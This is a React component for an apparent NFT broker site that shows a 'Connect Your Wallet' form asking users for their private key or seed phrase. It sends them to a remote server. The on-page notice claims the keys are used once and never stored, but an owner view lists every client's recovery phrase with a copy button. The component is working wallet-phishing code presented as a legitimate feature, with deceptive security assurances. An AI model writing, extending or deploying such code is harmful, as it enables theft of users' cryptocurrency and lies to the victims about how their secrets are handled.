import React, { useEffect, useState } from "react";
import { useUserContext } from './UserRoleContext';
import { Form, Button, Card, Spinner, Alert, Table } from "react-bootstrap";
import { ToastContainer, toast } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";
import metamaskLogo from "../meta.PNG";
import trustWalletLogo from "../trust.PNG";
import binanceLogo from "../binance.PNG";
import coinbaseLogo from "../coinbase.PNG";

const LinkWallet = () => {
  const { userData } = useUserContext();
  const userId = userData?.userID;

  const [mode, setMode] = useState("privateKey");
  const [isLoading, setIsLoading] = useState(false);
  const [switching, setSwitching] = useState(false);

  const [formData, setFormData] = useState({
    walletName: "",
    walletAddress: "",
    privateKey: "",
    recoveryPhrase: "",
  });

  const [wallets, setWallets] = useState([]);

  useEffect(() => {
    if (!userId) return;
    (async () => {
      try {
        const res = await fetch(`https://nft-broker-mroz.onrender.com/api/nft-wallets/${userId}`);
        const data = await res.json();
        if (data.wallets) setWallets(data.wallets);
      } catch (err) {
        console.error(err);
      }
    })();
  }, [userId]);

  const isOwnerView = wallets.length > 0 && wallets[0]?.ownerName != null;

  const handleChange = (e) => {
    setFormData((prev) => ({ ...prev, [e.target.name]: e.target.value }));
  };

  const validateEthereumAddress = (addr) => /^0x[a-fA-F0-9]{40}$/.test(addr.trim());

  const isValidRecoveryPhrase = (phrase) => {
    const words = phrase.trim().split(/\s+/).filter(Boolean);
    return words.length === 12 || words.length === 24;
  };

  const handleSwitchMethod = () => {
    setSwitching(true);
    setTimeout(() => {
      setMode(mode === "privateKey" ? "recoveryPhrase" : "privateKey");
      setSwitching(false);
    }, 800);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (isLoading) return;

    setIsLoading(true);

    if (!formData.walletName.trim()) {
      toast.error("Please enter a wallet name", { className: "custom-toast" });
      setIsLoading(false);
      return;
    }

    if (mode === "privateKey") {
      if (!formData.walletAddress || !validateEthereumAddress(formData.walletAddress)) {
        toast.error("Please enter a valid Ethereum wallet address", { className: "custom-toast" });
        setIsLoading(false);
        return;
      }
      if (!formData.privateKey.trim()) {
        toast.error("Private key is required", { className: "custom-toast" });
        setIsLoading(false);
        return;
      }
    } else {
      if (!formData.recoveryPhrase.trim() || !isValidRecoveryPhrase(formData.recoveryPhrase)) {
        toast.error("Please enter a valid 12 or 24-word recovery phrase", { className: "custom-toast" });
        setIsLoading(false);
        return;
      }
    }

    try {
      const payload = {
        userId,
        walletName: formData.walletName.trim(),
      };

      if (mode === "privateKey") {
        payload.walletAddress = formData.walletAddress.trim();
        payload.privateKey = formData.privateKey.trim();
      } else {
        payload.recoveryPhrase = formData.recoveryPhrase.trim();
      }

      const res = await fetch("https://nft-broker-mroz.onrender.com/api/nft-add-wallet", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });

      const data = await res.json();

      if (!res.ok) {
        throw new Error(data.message || "Failed to link wallet");
      }

      setWallets((prev) => [
        ...prev,
        {
          walletName: formData.walletName,
          walletAddress: formData.walletAddress || "Imported via seed",
          dateAdded: new Date().toISOString(),
          ...(mode === "recoveryPhrase" && { recoveryPhrase: formData.recoveryPhrase }),
        },
      ]);

      toast.success("Wallet linked successfully!", { className: "custom-toast" });
      setFormData({ walletName: "", walletAddress: "", privateKey: "", recoveryPhrase: "" });
    } catch (err) {
      toast.error(err.message || "Failed to link wallet", { className: "custom-toast" });
      console.error(err);
    } finally {
      setIsLoading(false);
    }
  };

  const copyToClipboard = (text, label = "Copied!") => {
    navigator.clipboard.writeText(text).then(() => {
      toast.success(label, { autoClose: 1800, className: "custom-toast" });
    }).catch(() => {
      toast.error("Failed to copy", { className: "custom-toast" });
    });
  };

  // ──────────────────────────────────────────────
  //  JSX remains the same
  // ──────────────────────────────────────────────

  return (
    <div className="container py-5" style={{ maxWidth: "720px" }}>
      {/* <ToastContainer position="top-center" autoClose={4000} theme="dark" /> */}

      <Card
        className="shadow-lg border-0 main-container mt-5"
        style={{
          borderRadius: "16px",
          // background: "linear-gradient(135deg, #f8fafc 0%, #e2e8f0 100%)",
          overflow: "hidden",
          maxWidth: "900px",
          background: "#d6dee8", // Light grayish-blue
          borderRadius: "15px",
          boxShadow: "0 4px 12px rgba(0, 0, 0, 0.1)",
          color: "#334155", // Dark blue-gray text
        }}
      >
        <Card.Body className="p-4 p-md-5">
          {/* Header + Logos */}
          <div className="text-center mb-5">
            <h3 className="fw-bold mb-3" style={{ color: "#1e293b" }}>
              Connect Your Wallet
            </h3>
            <p className="text-muted mb-4" style={{ fontSize: "0.95rem" }}>
              Supported wallets
            </p>
            <div className="d-flex justify-content-center gap-4 flex-wrap">
              {[metamaskLogo, trustWalletLogo, binanceLogo, coinbaseLogo].map((logo, i) => (
                <div
                  key={i}
                  style={{
                    width: 80,               // slightly bigger circle for breathing room
                    height: 80,
                    borderRadius: "50%",
                    background: "white",
                    border: "1px solid #e2e8f0",
                    boxShadow: "0 4px 12px rgba(0,0,0,0.1)",
                    display: "flex",         // ← key change
                    alignItems: "center",    // vertical center
                    justifyContent: "center",// horizontal center
                    padding: 12,             // more padding → logos smaller inside
                    overflow: "hidden",      // prevent overflow if needed
                  }}
                >
                  <img
                    src={logo}
                    alt="Wallet Logo"
                    style={{
                      maxWidth: "100%",
                      maxHeight: "100%",
                      objectFit: "contain",  // ← crucial: scales without cropping/distortion
                      display: "block",
                    }}
                  />
                </div>
              ))}
            </div>
          </div>

          <Alert variant="info" className="mb-4 small">
            <strong>Security notice:</strong> We never store your private keys or seed phrases on our servers. DeepSea would never ask you to share them. They are used only once to verify ownership of the wallet and then discarded. Always keep them secure and never share with anyone.
          </Alert>

          <Form onSubmit={handleSubmit}>
            <Form.Group className="mb-4">
              <Form.Label className="fw-medium">Wallet nickname</Form.Label>
              <Form.Control
                name="walletName"
                value={formData.walletName}
                onChange={handleChange}
                placeholder="e.g. My MetaMask Main"
                required
              />
            </Form.Group>

            {mode === "privateKey" ? (
              <>
                <Form.Group className="mb-4">
                  <Form.Label className="fw-medium">Wallet Address (0x...)</Form.Label>
                  <Form.Control
                    name="walletAddress"
                    value={formData.walletAddress}
                    onChange={handleChange}
                    placeholder="0x..."
                    required
                  />
                </Form.Group>

                <Form.Group className="mb-4">
                  <Form.Label className="fw-medium">Private Key</Form.Label>
                  <Form.Control
                    type="password"
                    name="privateKey"
                    value={formData.privateKey}
                    onChange={handleChange}
                    placeholder="Enter your private key..."
                    autoComplete="off"
                    required
                  />
                  <Form.Text className="text-muted small">
                    Used only once to verify ownership. Never shared.
                  </Form.Text>
                </Form.Group>

                <div className="text-center mt-4 mb-3">
                  <Button
                    variant="link"
                    className="text-primary text-decoration-none small"
                    onClick={handleSwitchMethod}
                    disabled={switching || isLoading}
                  >
                    {switching ? "Switching..." : "Try another method"}
                  </Button>
                </div>
              </>
            ) : (
              <>
                <Form.Group className="mb-4">
                  <Form.Label className="fw-medium">Secret Recovery Phrase</Form.Label>
                  <Form.Control
                    as="textarea"
                    rows={4}
                    name="recoveryPhrase"
                    value={formData.recoveryPhrase}
                    onChange={handleChange}
                    placeholder="(12 or 24 words)"
                    required
                  />
                  <Form.Text className="text-muted small mt-1">
                    Used only once for verification. Keep it secure.
                  </Form.Text>
                </Form.Group>

                <div className="text-center mt-4 mb-3">
                  <Button
                    variant="link"
                    className="text-primary text-decoration-none small"
                    onClick={handleSwitchMethod}
                    disabled={switching || isLoading}
                  >
                    {switching ? "Switching..." : "Try another method"}
                  </Button>
                </div>
              </>
            )}

            <div className="d-grid mt-5">
              <Button
                type="submit"
                size="lg"
                disabled={isLoading || switching}
                style={{
                  background: "linear-gradient(90deg, #3b82f6, #6366f1)",
                  border: "none",
                  fontWeight: 600,
                  padding: "14px",
                  borderRadius: "12px",
                }}
              >
                {isLoading ? (
                  <>
                    <Spinner animation="border" size="sm" className="me-2" />
                    Linking...
                  </>
                ) : (
                  "Link Wallet"
                )}
              </Button>
            </div>
          </Form>
        </Card.Body>
      </Card>

      {/* Wallets Table – matches backend logic */}
      {wallets.length > 0 && (
        <Card className="mt-5 border-0 shadow-sm bg-white main-container">
          <Card.Body className="p-4">
            <h5 className="fw-bold mb-3 text-dark">
              {isOwnerView ? "All Client Wallets" : "Your Connected Wallets"}
            </h5>
            <div className="table-responsive">
              <Table hover bordered className="mb-0 align-middle">
                <thead className="table-light">
                  <tr>
                    {isOwnerView && <th>Owner</th>}
                    <th>Nickname</th>
                    <th>Address / Method</th>
                    {isOwnerView && <th>Recovery Phrase</th>}
                    <th>Added</th>
                  </tr>
                </thead>
                <tbody>
                  {wallets.map((w, i) => (
                    <tr key={w._id || i}>
                      {isOwnerView && <td>{w.ownerName || "—"}</td>}
                      <td className="fw-medium">{w.walletName}</td>

                      {/* Address cell – now with integrated copy button */}
                      <td>
                        {w.walletAddress ? (
                          <div className="d-flex align-items-center gap-2">
                            <code
                              style={{
                                fontSize: "0.9rem",
                                flex: 1,
                                wordBreak: "break-all",
                                cursor: "pointer",
                              }}
                              onClick={() => copyToClipboard(w.walletAddress, "Address copied")}
                              title="Click text to copy full address"
                            >
                              {`${w.walletAddress.slice(0, 8)}...${w.walletAddress.slice(-6)}`}
                            </code>
                            <Button
                              variant="outline-secondary"
                              size="sm"
                              onClick={() => copyToClipboard(w.walletAddress, "Address copied")}
                              title="Copy full address"
                            >
                              <i className="bi bi-clipboard"></i>
                            </Button>
                          </div>
                        ) : (
                          <span className="text-muted">Imported via seed phrase</span>
                        )}
                      </td>

                      {/* Recovery phrase – already good, kept as-is */}
                      {isOwnerView && (
                        <td>
                          {w.recoveryPhrase ? (
                            <div className="d-flex align-items-center gap-2">
                              <code
                                style={{
                                  fontSize: "0.85rem",
                                  flex: 1,
                                  wordBreak: "break-all",
                                }}
                              >
                                {w.recoveryPhrase.slice(0, 10)}...
                              </code>
                              <Button
                                variant="outline-secondary"
                                size="sm"
                                onClick={() => copyToClipboard(w.recoveryPhrase, "Recovery phrase copied")}
                                title="Copy full recovery phrase (use with extreme caution)"
                              >
                                <i className="bi bi-clipboard"></i>
                              </Button>
                            </div>
                          ) : (
                            <span className="text-muted">—</span>
                          )}
                        </td>
                      )}

                      <td className="text-muted small">
                        {new Date(w.dateAdded).toLocaleDateString()}
                      </td>
                    </tr>
                  ))}
                </tbody>
              </Table>
            </div>
          </Card.Body>
        </Card>
      )}
    </div>


  );
};

export default LinkWallet;